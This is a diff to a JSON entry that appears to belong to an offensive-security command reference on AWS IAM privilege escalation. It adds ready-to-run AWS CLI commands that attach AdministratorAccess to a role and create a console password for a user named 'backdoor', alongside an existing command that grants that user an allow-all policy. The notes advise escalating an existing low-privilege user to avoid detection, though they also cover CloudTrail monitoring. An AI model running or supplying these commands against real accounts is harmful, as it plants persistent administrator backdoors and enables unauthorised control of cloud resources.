@@ -67,6 +67,16 @@
       "command": "aws --profile <profile> iam put-user-policy --user-name backdoor \\\n  --policy-name admin-access \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
     }
   ],
+  "variations": [
+    {
+      "label": "Attach admin policy to a role (role-based privesc)",
+      "command": "aws --profile <profile> iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name <role_name>"
+    },
+    {
+      "label": "Create login profile (console password) for backdoor user",
+      "command": "aws --profile <profile> iam create-login-profile --user-name backdoor --password <password>"
+    }
+  ],
   "notes": "The AdministratorAccess AWS managed policy ARN (arn:aws:iam::aws:policy/AdministratorAccess) is the same across all AWS accounts. This grants full access to all AWS services and resources. The SecretAccessKey is ONLY returned in the create-access-key response \u2014 AWS never shows it again. If lost, delete the access key and create a new one. Alternative: iam:CreateLoginProfile creates a console password (not access keys). Alternative: iam:PutUserPolicy / iam:AttachUserPolicy on a low-privilege existing user silently escalates without creating a new detectable user. CloudTrail logs all IAM API calls \u2014 iam:CreateUser, iam:AttachUserPolicy, and iam:CreateAccessKey appear in the audit trail. Defenders look for unusual iam:Create* calls, especially outside business hours or from unexpected source IPs.",
   "references": [
     {
